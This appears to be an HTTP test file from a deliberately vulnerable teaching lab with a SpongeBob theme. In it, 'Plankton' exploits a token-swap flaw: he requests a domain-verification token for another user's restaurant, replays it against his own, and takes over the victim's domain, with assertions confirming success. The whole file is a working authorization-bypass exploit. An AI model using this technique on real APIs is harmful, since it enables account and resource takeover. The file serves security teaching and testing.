# @import ../common/setup.http
@host = {{base_host}}/v307

# Plankton discovers he can hijack ANY restaurant by exploiting a token swap vulnerability.
# The key insight: the token is requested for one restaurant but used on another!

### Clear mailpit
{{
  await mailpit.clear();
}}

# --- Setup: Capture initial state ---

### Check current Krusty Krab state
GET /restaurants/1

?? status == 200

{{
  exports.originalDomain = response.parsedBody.domain;
  console.info("ðŸ¦€ Krusty Krab domain before attack:", response.parsedBody.domain);
}}


# --- EXPLOIT: Token Swap Attack ---

### Step 1: Plankton requests a domain change for Krusty Krab (restaurant 1)
# He provides HIS domain (chum-bucket.sea), which he controls.
# The system sends a verification token to admin@chum-bucket.sea
PATCH /restaurants/1
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "name": "HACKED by Plankton!",
  "description": "This restaurant is now under new management!",
  "domain": "chum-bucket.sea"
}

?? status == 200
?? body status == verification_email_sent

### Step 2: Plankton retrieves the token from his mailbox
# CRITICAL: This token contains restaurant_id: 1 (Krusty Krab)!
@token = {{(await mailpit.lastEmail("admin@chum-bucket.sea").userToken())}}

### Step 3: Plankton uses the token on HIS OWN restaurant (restaurant 2)
# The ownership check passes because he owns Chum Bucket (restaurant 2).
# But the handler extracts restaurant_id from the TOKEN (which is 1)!
PATCH /restaurants/2
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "domain": "chum-bucket.sea",
  "token": "{{token}}"
}

?? status == 200
?? body id == 1
?? body domain == chum-bucket.sea

{{
  console.info("ðŸŽ¯ EXPLOIT SUCCESS! Response shows restaurant ID:", response.parsedBody.id);
  console.info("   Plankton called /restaurants/2 but hijacked restaurant 1!");
}}


# --- Verify the damage ---

### Krusty Krab has been hijacked!
GET /restaurants/1

?? status == 200
?? body domain == chum-bucket.sea

{{
  console.info("ðŸ’€ Krusty Krab domain changed from", originalDomain, "to", response.parsedBody.domain);
  console.info("   Mr. Krabs just lost control of his restaurant!");
}}
